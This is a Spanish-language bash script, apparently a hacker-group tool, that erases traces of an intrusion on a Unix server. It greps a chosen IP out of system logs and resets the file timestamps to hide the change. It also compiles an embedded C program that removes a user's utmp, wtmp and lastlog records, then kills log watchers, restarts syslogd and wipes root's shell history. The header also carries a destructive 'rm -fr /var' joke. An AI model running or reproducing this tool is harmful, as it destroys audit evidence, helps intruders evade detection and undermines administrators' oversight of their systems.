#!/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11
export PATH
#******************************************************************************
#* BUSCA TU IP/USER EN EL SERVER .. REVISA LOS LOG                            *
#* EN BUSCA DE TU IP... LUEGO LOS BORRA .									  *	
#* CREADO POR Dr|3xe 													      *
#* EMAIL	dr3xe@usa.net ; CONSULTAS, RECLAMOS, OFERTAS, CONTRATOS :D    *
#* EMAIL 0wn3d: 0wn3dy2k@usa.net											  *	
#* SITIO WEB: www.0wn3d.f2s.com 	VISITALA...                               *  
#* 																	  *
#* ESPERO QUE LES SEA UTIL.. NO ABUSEN. 	rm -fr /var :D (mas corto)        *
#* AL QUE NO LE GUSTE SE VA A LA CHUCHA!!!!									  *	
#*																	  *			
#******************************************************************************
# colors
COUNT=0
F_RESET="[0m"
F_NEGRO="[0;30m"
F_VERDE="[0;32m"
F_AZUL="[0;34m"
F_MAGENTA="[0;35m"
F_BLANCO="[0;37m"

H_ROJO="[1;31m"
H_NEGRO="[1;30m"
H_VERDE="[1;32m"
H_AZUL="[1;34m"
H_MAGENTA="[1;35m"
H_BLANCO="[1;37m"
#
zaper () {
cat << _EOF_ >> /tmp/.x.c

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>

/* all systems support utmp and wtmp */
#define WTMP_NAME "/var/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
/* utmpx and wtmpx are present on Sys VR4 systems. solaris, irix */
 /* #define WTMPX_NAME "/var/adm/wtmpx"
    #define UTMPX_NAME "/var/adm/utmpx"
 */
/* lastlog is present on linux, sunos, solaris, irix, ultrix
   osf, digital unix. Not on hpux and bsdi, freebsd and therelike. */
#define LASTLOG_NAME "/var/adm/lastlog"

#define TMP_NAME "/tmp/.XthcX.tmp"

#ifdef LASTLOG_NAME
#include <lastlog.h>
#endif
#ifdef WTMPX_NAME
#define TMPX
#include <utmpx.h>
#endif
#ifdef UTMPX_NAME
#ifndef WTMPX_NAME
#define TMPX
#include <utmpx.h>
#endif
#endif

#ifdef _PATH_UTMP
#undef UTMP_NAME
#define UTMP_NAME _PATH_UTMP
#endif
#ifdef _PATH_WTMP
#undef WTMP_NAME
#define WTMP_NAME _PATH_WTMP
#endif
#ifdef _PATH_LASTLOG
#undef LASTLOG_NAME
#define LASTLOG_NAME _PATH_LASTLOG
#endif
 
int f;
int g;
long found = 0;
    
int move_file(char to[100], char from[100])
{
    char buf[BUFSIZ];
    long readin;
    int result = 0;

    if ((f=open(from,O_RDONLY))>=0)
    {
        if ((g=open(to,O_WRONLY | O_CREAT | O_TRUNC))>=0)
        {
             while((readin = read(f, buf, sizeof(buf)))> 0)
                  write (g, buf, readin);
             close(g);
        } else {
             printf ("no se ah encontrado file : %s\n", to);
             result += 2;
 	}
        close(f);
    } else {
        printf ("no puede abrir %s\n", from);
        result += 1;
    }
    return(result);
}

void kill_tmp(char *who, char file[100])
{
    struct utmp utmp_ent;
    long pos = 0L;
    found=0;

    if ((f=open(file,O_RDONLY))>=0) 
    {
        if ((g=open(TMP_NAME,O_WRONLY | O_CREAT | O_TRUNC, 0600))>=0)
        {
            while(pos != -1L) 
            {
                lseek(f,(long) ( pos * (long)(sizeof(struct utmp))), 0);
                if ( read(f, &utmp_ent, sizeof (struct utmp)) < sizeof (struct utmp) ) 
                {
                    pos = -1L;
                } else {
                        if (strncmp(utmp_ent.ut_name,who,strlen(who) == 0 ? 1 : strlen(who))) 
                        {
	      		    write (g, &utmp_ent, sizeof (utmp_ent));
                            pos += 1L;
                        } else {
                            if ((strlen(who) == 0) && (utmp_ent.ut_time != 0))
                            {
                                 write (g, &utmp_ent, sizeof (utmp_ent));
                            } else {
				 found++;
			    } 
                            pos += 1L;
                        }
                }
            }
            close(f);
            close(g);
            if (move_file(file, TMP_NAME))
                printf ("Can't move file %s to %s\n, file, TMP_NAME"); 
        } else {
             printf ("Can't write tmp file : %s\n", TMP_NAME);
             close(f);
        }
    } else  
        fprintf(stderr,"Can't find %s\n", file);
}

#ifdef TMPX
void kill_tmpx(char *who, char file[100])
{
    struct utmpx utmp_ent;
    long pos = 0L;
    found=0;
           
    if ((f=open(file,O_RDONLY))>=0)
    {
        if ((g=open(TMP_NAME,O_WRONLY | O_CREAT | O_TRUNC, 0600))>=0)
        {
            while(pos != -1L)
            {
                lseek(f,(long)( (sizeof(struct utmp)) * pos), 0);
                if (read (f, &utmp_ent, sizeof (struct utmp))< sizeof (struct utmp))
                {
                    pos = -1L;
                } else {
                        if (strncmp(utmp_ent.ut_name,who,strlen(who) == 0 ? 1 : strlen(who)))
                        {
                            write (g, &utmp_ent, sizeof (utmp_ent));
                            pos += 1L;
                        } else {
                            if ((strlen(who) == 0) && (utmp_ent.ut_xtime != 0))
                            {
                            	write (g, &utmp_ent, sizeof (utmp_ent));
                            } else {
                                found++;
                            }
                            pos += 1L;
                        }
                }
            }
            close(f);
            close(g);
            if (move_file(file, TMP_NAME))
                printf ("Can't move file %s to %s\n, file, TMP_NAME");
        } else {
            printf ("Can't write tmp file : %s\n", TMP_NAME);
            close(f);
        }
    } else
        fprintf(stderr,"Can't find %s\n", file);
}
#endif

void kill_lastlog(char *who)
{
    struct passwd *pwd;
    struct lastlog newll;
 
    if ((pwd=getpwnam(who))!=NULL) 
    {
        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) 
        {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            newll.ll_time=0;
            bzero((char *)&newll.ll_line, strlen(newll.ll_line));
            bzero((char *)&newll.ll_host, strlen(newll.ll_host));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        } else { 
            printf ("Can't find lastlog in %s\n", LASTLOG_NAME);
        }
    } else 
        fprintf(stderr," Can't find user %s in passwd\n",who);
}

 
main(int argc, char *argv[])
{
#ifndef TMP_NAME
    fprintf(stderr,"TMP_NAME not defined. Edit source and recompile ...\n");
    return(1);
#endif

    if (argc==2) {
    
    if (!strcmp(argv[1],"0"))
    {
	fprintf(stderr, "Killing Zap'ed entries -> ");
    	argv[1] = "";
    };

    
#ifdef WTMP_NAME
	fprintf(stderr,"wtmp ... ");
        kill_tmp(argv[1], WTMP_NAME);
#endif
#ifdef WTMPX_NAME
	fprintf(stderr,"wtmpx ... ");
        kill_tmpx(argv[1], WTMPX_NAME);
#endif
#ifdef UTMP_NAME
	fprintf(stderr,"utmp ... ");
        kill_tmp(argv[1], UTMP_NAME);
#endif
#ifdef UTMPX_NAME
        fprintf(stderr,"utmpx ... ");
        kill_tmpx(argv[1], UTMPX_NAME);
#endif
#ifdef LASTLOG_NAME
        if (argv[1] != "")
        {
            fprintf(stderr,"lastlog ... ");
            kill_lastlog(argv[1]);
        }
#endif
        if (unlink(TMP_NAME) < 0)
            fprintf(stderr,"Can't remove %s, do it by hand ... ",TMP_NAME);
        fprintf(stderr,"Bien!\n");
        if (argv[1] != "")
            fprintf(stderr,"listo a sido borrado el user %s\n",argv[1]);
        else
            fprintf(stderr,"Stage cleared from Zap'ed entries\n");
    } else
        fprintf(stderr,"Usage : %s username\n",argv[0]);           
}

_EOF_
gcc /tmp/.x.c -o /tmp/.xx
echo $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Compilando zap..."$H_VERDE"   ok"
cd /tmp
./.xx $GOO 1>/dev/null 2>/dev/null
echo -n $H_VERDE" --->" $H_BLANCO"en /var/log/lastlog"
echo $H_ROJO"  Listo ! "
echo -n $H_VERDE" --->" $H_BLANCO"en /var/log/utmp"
echo $H_ROJO"  Listo ! "
echo -n $H_VERDE" --->" $H_BLANCO"en /var/log/wtmp"
echo $H_ROJO"  Listo ! "
echo; rm /tmp/.x.c; rm /tmp/.xx
}
#
mess () {
        clear
        echo $H_BLANCO"  [][][][][][]" $H_VERDE ":::[" $H_BLANCO"0wn3d" $H_VERDE"]:::" $H_AZUL "www.0wn3d.f2s.com" $H_BLANCO "[][][][][][]" $H_RESET 
      echo $F_RESET
echo $H_AZUL"   .o."$H_BLANCO"   Programa escanea/borra tu ip del Server "$H_AZUL"  .o."  
echo $H_BLANCO"			 by Dr|3xe"$F_RESET
}
fin_scan () {
 echo $H_AZUL" .o."$H_BLANCO"    Scaner de tu Ip/Host Finalizado "$H_AZUL"      .o."$F_RESET
echo
}        
fin_clean () {
 echo $H_AZUL" .o."$H_BLANCO"    Limpiesa de tu Ip/Host a Finalizado "$H_AZUL"      .o."$F_RESET
echo
}
find_log () {
	echo "" > /tmp/.x
        find $DIRE -name *log.* >> /tmp/.x 
        find $DIRE -name *lastlog* >> /tmp/.x 
        find $DIRE -name *utmp* >> /tmp/.x 
        find $DIRE -name *syslog* >> /tmp/.x 
        find $DIRE -name *xferlog* >> /tmp/.x 
        find $DIRE -name *wtmp* >> /tmp/.x 
        find $DIRE -name *maillog* >> /tmp/.x 
        find $DIRE -name *messages* >> /tmp/.x 
        find $DIRE -name *secure* >> /tmp/.x 
        find $DIRE -name *access_log* >> /tmp/.x 
        find $DIRE -name *error_log* >> /tmp/.x 
        find $DIRE -name *msgs* >> /tmp/.x 
        find $DIRE -name *.log* >> /tmp/.x
        find $DIRE -name *.log* >> /tmp/.x  
}     
uso () {
        echo 
        echo  $H_VERDE"Uso:"$F_RESET 
echo
echo $H_BLANCO" $0 -s" $H_VERDE"<"$H_BLANCO"IP/Host"$H_VERDE">"$H_VERDE" <"$H_BLANCO"/path"$H_VERDE">"$H_AZUL" :"  $H_BLANCO "Scanea tu ip en el server (log)"
echo $H_VERDE"                                      *"$H_BLANCO" </path> = default /var" 
        echo $H_BLANCO" $0 -c "$H_VERDE"<"$H_BLANCO"IP/Host"$H_VERDE">" $H_VERDE"<"$H_BLANCO"user"$H_VERDE">"   $H_AZUL" :"$H_BLANCO "Limpia tu ip *(Necesita antes"
echo "		                    haber usado la primera opcion)" 
echo $H_BLANCO" $0 -x" $H_VERDE"<"$H_BLANCO"IP/Host"$H_VERDE">" $H_VERDE"<"$H_BLANCO"user"$H_VERDE">"$H_AZUL"  :"$H_BLANCO" No necesita de ninguna opcion anterior"
echo "				    scanea y borra a la vez *(RECOMENDABLE)"
echo  $H_BLANCO" $0 -clean"$H_AZUL"               :"$H_BLANCO" limpia los registros de /tmp" 
echo
echo       
exit 1
}
found () {
	  ENC=`wc /tmp/.x |cut -c-7`
}
encontrado () {
	  YES=`wc /tmp/.f |cut -c-7`
}
scan_log () {
     echo $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Ip/Host $IP .."
     echo $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Buscando archivos log..."$H_VERDE"   ok"
     find_log;
     echo -n $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Fueron"
     found
     echo " encontrados $ENC archivos log"
}
scan_ip () {
    echo $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Buscando nuestro ip en los log..."$H_VERDE"   ok"
     for xx in `cat /tmp/.x`
     do
     echo -n $H_VERDE" --->" $H_BLANCO"en $xx ..."
		si=`cat $xx | grep -i $IP`
		
		if [ "$si" ]; then
			echo $xx >> /tmp/.f ;echo $H_ROJO" Encontrado..."$H_RESET
                else
                echo $H_VERDE" No .."$H_RESET
                fi
	done
 	echo       
	if [ -s /tmp/.f ]; then
        echo -n $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" El ip fue"
	encontrado
	echo " encontrado en ... $YES archivos log"
	echo
        else
        echo -n $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" El ip No fue encontrado ..."
        echo "" >> /tmp/.f
	echo
        fi
        echo
	echo $H_AZUL"   .o."$H_BLANCO"   Mirar encontrados en /tmp/.f"$H_AZUL"    .o."$F_RESET 
}   
clear_pre () {
  echo $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Ip/Host $IP .."
  echo $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Borrando nuestro Ip/host de los log.."$H_VERDE"   ok"
     grep -v wtmp /tmp/.f >> /tmp/.d
     grep -v utmp /tmp/.d >> /tmp/.e
     grep -v lastlog /tmp/.e >> /tmp/.b
     rm /tmp/.f; rm /tmp/.d; rm /tmp/.e
     for xx in `cat /tmp/.b`
     do
     echo -n $H_VERDE" --->" $H_BLANCO"en $xx ..."
     cat $xx | grep -v $IP > /tmp/.temp
			mv /tmp/.temp $xx
			touch -r /bin/ls $xx
			echo $H_ROJO"  Listo !"
	done
}	
clear_todo () {
echo $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Ip/Host $IP .."
  echo $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Borrando nuestro Ip/host de los log.."$H_VERDE"   ok"
                grep -v wtmp /tmp/.x >> /tmp/.d
                grep -v utmp /tmp/.d >> /tmp/.e
                grep -v lastlog /tmp/.e >> /tmp/.b
                rm /tmp/.x; rm /tmp/.d; rm /tmp/.e   
                for xxx in `cat /tmp/.b`
	        do
		echo -n $H_VERDE"--> en"$H_BLANCO" $xxx..."$F_RESET
		si=`cat $xxx | grep -i $IP`
		if [ "$si" ]; then
		echo -n $H_BLANCO" Encontrado..."$F_RESET
                cat $xxx | grep -v $IP > /tmp/.temp
			mv /tmp/.temp $xxx
			touch -r /bin/ls $xxx
			echo $H_ROJO"  Listo !"$F_RESET
                else
                echo $H_VERDE" No .."$H_RESET
                fi
	        done
		echo       
}	
clear_log () {
     echo $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Kileando proceso tail..."$H_VERDE"   ok"
     killall -9 tail 1>/dev/null 2>/dev/null
     echo $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Kileando syslog..."$H_VERDE"   ok"	
     killall -HUP syslogd 1>/dev/null 2>/dev/null
     echo -n $H_BLANCO"["$H_VERDE"*"$H_BLANCO"]"" Deteniendo .bash_history"$H_VERDE"   ok"
     unset HISTFILE; echo "" > /root/.bash_history
     HIST='unset HISTFILE'
     $HIST
     rm /tmp/.* 1>/dev/null 2>/dev/null
     echo
     echo
}
noo () {
	mess;
        echo
echo $H_BLANCO"["$H_VERDE"ERROR !!!"$H_BLANCO"]"" Debes poner primero la opcion $0 -s <host>"
echo $H_VERDE"            $0"$H_BLANCO" -h (para ayuda)"
echo
echo
}
verify () {
	if [ -s /tmp/.x ]; then
		if [ -s /tmp/.f ]; then
        	clear_pre;
        	zaper;
		clear_log;	
		fin_clean;
        	else	
		noo;
	fi
        else
        	noo;
fi
}
nooo () {
mess;
        echo
echo $H_BLANCO"["$H_VERDE"ERROR !!!"$H_BLANCO"]"" Opcion -c : $0 -c <IP/Host> <User> "
echo $H_VERDE"            $0"$H_BLANCO" -h (para ayuda)"
echo
echo
}	
no_scan () {
        mess;
        echo
echo $H_BLANCO"["$H_VERDE"ERROR !!!"$H_BLANCO"]"" Opcion -s : $0 -s <IP/Host>"
echo $H_VERDE"            $0"$H_BLANCO" -h (para ayuda)"
echo
}
no_o () {
        mess;
        echo
echo $H_BLANCO"["$H_VERDE"ERROR !!!"$H_BLANCO"]"" Opcion -x : $0 -x <IP/Host> <User> </path>"
echo $H_VERDE"            $0"$H_BLANCO" -h (para ayuda)"
echo
}
verify_scan () {
	if [ -s /tmp/.f ]; then
        mess;
        echo
        echo $H_BLANCO"["$H_VERDE"ERROR !!!"$H_BLANCO"]"" Ya existe un registro en.. /tmp/.f Utiliza la opcion"
echo $H_BLANCO"      -clean o -c <IP/Host> <User> para limpiar estos registros"
echo
	else
        scan_log;
        scan_ip;
        fin_scan;
fi
}   
if [ $1x = x ]; then
	mess;
        uso;
	exit 1
fi
if [ "$1" = '-s' ]; then
        if [ "$3" = "" ]; then
	DIRE="/var"
			if [ "$2" = "" ]; then
            		no_scan;
        else
        		IP="$2"
			mess;
        		verify_scan
        fi 
else
			if [ "$2" = "" ]; then
            		no_scan;
        else
        		DIRE=$3
        		IP="$2"
			mess;
        		verify_scan
        fi 
    fi
fi
if [ "$1" = '-c' ]; then
      IP=$2       
      GOO=$3 
    if [ "$2" = "" ]; then
           nooo;
       				 else	
           if [ "$3" = "" ]; then 
    	   GOO=$3       
	   nooo;
           else
           mess;
           verify; 
           fi
    fi
fi
if [ "$1" = '-h' ]; then
	mess;
        uso;
        exit 1
fi
if [ "$1" = '-x' ]; then
          if [ "$4" = "" ]; then
	            DIRE="/var"
			if [ "$2" = "" ]; then
            		no_o;
			else                    
						if  [ "$3" = "" ]; then
                    					no_o;
                    			
						else
        							GOO=$3            					
								IP="$2"
                                        mess;  
                    					scan_log;
                    					clear_todo;
								zaper;
								clear_log;			
								fin_clean;
		                fi
	  fi
else
			if [ "$2" = "" ]; then
            		no_o;
                    else
                    			if [ "$3" = "" ]; then
                    				no_o;
                    			else
       							GOO=$3 						
							DIRE=$4
        						IP="$2"
							mess;
                    				scan_log;
                    				clear_todo;
							zaper;
							clear_log;
							fin_clean;
                 fi 
          fi		
    fi
fi
if [ "$1" = '-clean' ]; then
    if [ -s /tmp/.f ]; then
       rm /tmp/.* 1>/dev/null 2>/dev/null
    echo
    echo $H_BLANCO"["$H_VERDE"Bien !"$H_BLANCO"]"" Han sido limpiados los registros"
    echo
    else
    echo
echo $H_BLANCO"["$H_VERDE"Atencion"$H_BLANCO"]"" No es necesaria la opcion.."
echo
   fi
fi

 
      
        
